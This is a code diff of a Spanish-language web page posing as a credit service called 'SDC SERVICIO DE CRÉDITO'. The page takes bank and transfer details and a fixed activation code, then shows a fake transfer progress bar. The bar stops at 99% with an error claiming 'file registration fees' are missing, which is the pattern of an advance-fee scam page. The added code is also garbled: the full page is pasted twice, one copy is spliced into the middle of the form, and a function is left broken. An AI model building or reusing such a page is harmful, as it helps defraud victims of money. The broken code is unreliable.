@@ -1,204 +1,369 @@
-<!DOCTYPE html>
-<html lang="es">
+<!DOCTYPE html><html lang="es">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>SDC SERVICIO DE CRÉDITO</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SDC SERVICIO DE CRÉDITO - Simulación de Transferencia</title>
   <style>
     body {
       margin: 0;
-      font-family: 'Inter', sans-serif;
-      background-color: #f5f8fc;
-      color: #1c1c1e;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f5f7fa;
+      color: #1f2d3d;
     }
     header {
-      background-color: #0a3e91;
-      color: white;
-      padding: 1rem;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-weight: 600;
-      font-size: 1.2rem;
+      background-color: #ffffff;
+      padding: 20px;
+      text-align: center;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    header h1 {
+      margin: 0;
+      color: #0057b8;
     }
     .container {
-      max-width: 500px;
-      margin: 2rem auto;
+      max-width: 600px;
+      margin: 30px auto;
       background: white;
-      padding: 2rem;
+      padding: 30px;
       border-radius: 12px;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+      box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+    }
+    .detalle {
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      padding: 15px;
+      margin-bottom: 20px;
+      background: #f0f3f7;
+    }
+    .detalle p {
+      margin: 5px 0;
     }
     label {
       display: block;
-      margin-bottom: 0.5rem;
-      font-weight: 600;
+      margin-top: 15px;
+      font-weight: bold;
     }
-    input, select {
+    input, select, textarea, button {
       width: 100%;
-      padding: 0.8rem;
-      margin-bottom: 1.5rem;
+      padding: 10px;
+      margin-top: 5px;
+      border-radius: 6px;
       border: 1px solid #ccc;
-      border-radius: 8px;
     }
     button {
-      background-color: #0a3e91;
+      background-color: #0057b8;
       color: white;
-      border: none;
-      padding: 0.9rem 1.5rem;
-      width: 100%;
-      font-size: 1rem;
-      font-weight: 600;
-      border-radius: 8px;
+      font-weight: bold;
       cursor: pointer;
+      transition: background 0.3s ease;
     }
-    #progress-screen {
+    button:hover {
+      background-color: #003f8a;
+    }
+    .hidden {
       display: none;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      text-align: center;
     }
-    .progress-bar {
-      width: 80%;
-      height: 20px;
-      background: #ddd;
-      border-radius: 10px;
+    .barra-progreso {
+      height: 30px;
+      background: #e0e0e0;
+      border-radius: 8px;
       overflow: hidden;
-      margin-top: 2rem;
+      margin-top: 20px;
     }
-    .progress {
+    .barra-interna {
       height: 100%;
       width: 0%;
-      background: #0a3e91;
-      transition: width 0.3s ease;
+      background: #0057b8;
+      transition: width 0.5s ease;
     }
-    .alert-box {
+    .alerta {
       position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      background: #fff3cd;
-      color: #856404;
-      padding: 1.5rem;
-      border-radius: 10px;
-      border: 1px solid #ffeeba;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-      display: none;
-      z-index: 100;
-      max-width: 90%;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0,0,0,0.6);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 10;
     }
-    .alert-box button {
-      margin-top: 1rem;
-      background-color: #0a3e91;
-      color: white;
-      border: none;
-      padding: 0.5rem 1rem;
-      border-radius: 6px;
+    .alerta-content {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      text-align: center;
+      max-width: 500px;
     }
   </style>
 </head>
 <body>
   <header>
-    🏦 SDC SERVICIO DE CRÉDITO
-  </header>
-
-  <div class="container" id="form-container">
-    <h2 style="text-align:center; margin-bottom: 2rem;">Detalles del Virement</h2>
-
-    <form id="virementForm">
-      <label for="iban">IBAN / Número de Cuenta</label>
-      <input type="text" id="iban" required />
-
-      <label for="banco">Nombre del Banco</label>
-      <input type="text" id="banco" required oninput="generateCode()" />
-
-      <label for="bic">Código Banco (BIC/SWIFT)</label>
-      <input type="text" id="bic" readonly />
-
-      <label for="beneficiario">Nombre del Beneficiario</label>
-      <input type="text" id="beneficiario" required />
-
-      <label for="monto">Importe del Virement</label>
-      <input type="number" id="monto" required />
-
-      <label for="moneda">Moneda</label>
+    <h1>SDC SERVICIO DE CRÉDITO</h1>
+  </header>  <div class="container" id="pagina1">
+    <form onsubmit="event.preventDefault(); mostrarResumen()">
+      <label>Nombre completo</label>
+      <input type="text" id="nombre" required>
+      <label>Nombre del banco</label>
+      <input type="text" id="banco" required>
+      <label>IBAN / Número de cuenta</label>
+      <input type="text" id="iban" required>
+      <label>País</label>
+      <input type="text" id="pais" required>
+      <label>Monto</label>
+      <input type="number" id="monto" required>
+      <label>Moneda</label>
       <select id="moneda">
         <option value="MXN">MXN</option>
         <option value="USD">USD</option>
         <option value="EUR">EUR</option>
       </select>
-
-      <label for="motivo">Motivo del Virement</label>
-      <input type="text" id="motivo" required />
-
-      <label for="code">🔒 Ingrese el código de activación del envío</label>
-      <input type="password" id="code" placeholder="*********" required />
-
-      <button type="submit">Continuar ahora</button>
+      <label>Motivo del envío</label>
+      <textarea id="motivo" required></textarea>
+      <button type="submit">Siguiente</button>
+<!DOCTYPE html><html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SDC SERVICIO DE CRÉDITO - Simulación de Transferencia</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f5f7fa;
+      color: #1f2d3d;
+    }
+    header {
+      background-color: #ffffff;
+      padding: 20px;
+      text-align: center;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    header h1 {
+      margin: 0;
+      color: #0057b8;
+    }
+    .container {
+      max-width: 600px;
+      margin: 30px auto;
+      background: white;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+    }
+    .detalle {
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      padding: 15px;
+      margin-bottom: 20px;
+      background: #f0f3f7;
+    }
+    .detalle p {
+      margin: 5px 0;
+    }
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: bold;
+    }
+    input, select, textarea, button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+    }
+    button {
+      background-color: #0057b8;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    button:hover {
+      background-color: #003f8a;
+    }
+    .hidden {
+      display: none;
+    }
+    .barra-progreso {
+      height: 30px;
+      background: #e0e0e0;
+      border-radius: 8px;
+      overflow: hidden;
+      margin-top: 20px;
+    }
+    .barra-interna {
+      height: 100%;
+      width: 0%;
+      background: #0057b8;
+      transition: width 0.5s ease;
+    }
+    .alerta {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0,0,0,0.6);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 10;
+    }
+    .alerta-content {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      text-align: center;
+      max-width: 500px;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>SDC SERVICIO DE CRÉDITO</h1>
+  </header>  <div class="container" id="pagina1">
+    <form onsubmit="event.preventDefault(); mostrarResumen()">
+      <label>Nombre completo</label>
+      <input type="text" id="nombre" required>
+      <label>Nombre del banco</label>
+      <input type="text" id="banco" required>
+      <label>IBAN / Número de cuenta</label>
+      <input type="text" id="iban" required>
+      <label>País</label>
+      <input type="text" id="pais" required>
+      <label>Monto</label>
+      <input type="number" id="monto" required>
+      <label>Moneda</label>
+      <select id="moneda">
+        <option value="MXN">MXN</option>
+        <option value="USD">USD</option>
+        <option value="EUR">EUR</option>
+      </select>
+      <label>Motivo del envío</label>
+      <textarea id="motivo" required></textarea>
+      <button type="submit">Siguiente</button>
     </form>
-  </div>
-
-  <div id="progress-screen">
-    <h2>Transferencia en curso, por favor espere...</h2>
-    <div class="progress-bar">
-      <div class="progress" id="progress"></div>
+  </div>  <div class="container hidden" id="pagina2">
+    <div class="detalle" id="resumen1"></div>
+    <label>Ingrese el código de activación</label>
+    <input type="text" id="codigo">
+    <button onclick="verificarCodigo()">Validar código</button>
+  </div>  <div class="container hidden" id="pagina3">
+    <div class="detalle" id="resumen2"></div>
+    <h3>Transferencia en proceso...</h3>
+    <div class="barra-progreso">
+      <div class="barra-interna" id="progreso"></div>
     </div>
-  </div>
-
-  <div class="alert-box" id="alert-box">
-    <strong>⚠️ Transferencia rechazada</strong>
-    <p>Faltan los <strong>gastos de registro del expediente</strong> en nuestra plataforma.</p>
-    <button onclick="closeAlert()">Cerrar</button>
-  </div>
-
-  <script>
-    function generateCode() {
-      const banco = document.getElementById('banco').value.toLowerCase();
-      const bic = document.getElementById('bic');
-      const bicCodes = {
-        'azteca': 'AZTKMXMMXXX',
-        'banorte': 'MENOMXMTXXX',
-        'santander': 'BSCHMXMMXXX',
-        'bbva': 'BCMRMXMMXXX'
-      };
-      for (const name in bicCodes) {
-        if (banco.includes(name)) {
-          bic.value = bicCodes[name];
-          return;
-        }
-      }
-      bic.value = 'N/A';
+  </div>  <div class="alerta hidden" id="alerta">
+    <div class="alerta-content">
+      <h2>Error de transferencia</h2>
+      <p>Faltan los gastos de registro del expediente. Por favor, verifique su estado.</p>
+      <button onclick="document.getElementById('alerta').classList.add('hidden')">Cerrar</button>
+    </div>
+  </div>  <script>
+    function mostrarResumen() {
+      const datos = obtenerDatos();
+      const resumen = generarHTMLResumen(datos);
+      document.getElementById('resumen1').innerHTML = resumen;
+      document.getElementById('pagina1').classList.add('hidden');
+      document.getElementById('pagina2').classList.remove('hidden');
     }
 
-    function closeAlert() {
-      document.getElementById('alert-box').style.display = 'none';
+    function verificarCodigo() {
+      const code = document.getElementById('codigo').value;
+      if (code === "501304") {
+        const datos = obtenerDatos();
+        const resumen = generarHTMLResumen(datos);
+        document.getElementById('resumen2').innerHTML = resumen;
+        document.getElementById('pagina2').classList.add('hidden');
+        document.getElementById('pagina3').classList.remove('hidden');
+        iniciarProgreso();
+      } else {
+        alert("Código incorrecto");
+      }
     }
 
-    document.getElementById('virementForm').addEventListener('submit', function(e) {
-      e.preventDefault();
-      const code = document.getElementById('code').value;
-      if (code !== '501304') {
-        alert('Código de activación incorrecto.');
-        return;
-      }
-
-      document.getElementById('form-container').style.display = 'none';
-      document.getElementById('progress-screen').style.display = 'flex';
-
-      let progress = 0;
-      const interval = setInterval(() => {
-        if (progress >= 99) {
-          clearInterval(interval);
-          document.getElementById('alert-box').style.display = 'block';
+    function iniciarProgreso() {
+      let progreso = 0;
+      const barra = document.getElementById('progreso');
+      const intervalo = setInterval(() => {
+        progreso += 1;
+        if (progreso <= 99) {
+          barra.style.width = progreso + "%";
         } else {
-          progress += 1;
-          document.getElementById('progress').style.width = progress + '%';
+          clearInterval(intervalo);
+          document.getElementById('alerta').classList.remove('hidden');
         }
-      }, 100);
-    });
-  </script>
-</body>
-</html>
+      }, 80);
+    }
+
+    function obtenerDatos() {
+      return {
+        nombre: document.getElementById('nombre').value,
+        banco: document.getElementById('banco').value,
+        iban: document.getElementById('iban').value,
+        pais: document.getElementById('pais').value,
+        monto: document.getElementById('monto').value,
+        moneda: document.getElementById('moneda').value,
+        motivo: document.getElementById('motivo').value
+      };
+    }
+
+    function generarHTMLResumen(datos) {
+      return `
+        <p><strong>Banco:</strong> ${datos.banco}</p>
+        <p><strong>Cuenta IBAN:</strong> ${datos.iban}</p>
+        <p><strong>Beneficiario:</strong> ${datos.nombre}</p>
+        <p><strong>País:</strong> ${datos.pais}</p>
+        <p><strong>Monto:</strong> ${datos.monto} ${datos.moneda}</p>
+        <p><strong>Motivo:</strong> ${datos.motivo}</p>
+      `;
+    }
+  </script></body>
+</html>￼Enter</form>
+  </div>  <div class="container hidden" id="pagina2">
+    <div class="detalle" id="resumen1"></div>
+    <label>Ingrese el código de activación</label>
+    <input type="text" id="codigo">
+    <button onclick="verificarCodigo()">Validar código</button>
+  </div>  <div class="container hidden" id="pagina3">
+    <div class="detalle" id="resumen2"></div>
+    <h3>Transferencia en proceso...</h3>
+    <div class="barra-progreso">
+      <div class="barra-interna" id="progreso"></div>
+    </div>
+  </div>  <div class="alerta hidden" id="alerta">
+    <div class="alerta-content">
+      <h2>Error de transferencia</h2>
+      <p>Faltan los gastos de registro del expediente. Por favor, verifique su estado.</p>
+      <button onclick="document.getElementById('alerta').classList.add('hidden')">Cerrar</button>
+    </div>
+  </div>  <script>
+    function mostrarResumen() {
+      const datos = obtenerDatos();
+      const resumen = generarHTMLResumen(datos);
+      document.getElementById('resumen1').innerHTML = resumen;
+      document.getElementById('pagina1').classList.add('hidden');
+      document.getElementById('pagina2').classList.remove('hidden');
+    }
+    
+      const code = document.getElementById('codigo').value;
+      if (code === "501304") {
+        const datos = obtenerDatos();
+        const resumen = generarHTMLResumen(datos);
+        document.getElementById('resumen2').innerHTML = resumen;
+        document.getElementById('pagina2').classList.add('hidden');
+        document.getElementById('pagina3').classList.remove('hidden');
+        iniciarProgreso();
+      } else {
+        alert("Código incorrecto");
+      }
+    }
+
+    function iniciarProgreso() {
+      let progreso = 0;
+      const barra = document.getElementById('progreso');
+      const intervalo = setInterval(() => {
+        progreso += 1;
+        if (progreso <= 99) {
+          barra.style.width = progreso + "%";
+        } else {
+          clearInterval(intervalo);
+          document.getElementById('alerta').classList.remove('hidden');
+        }
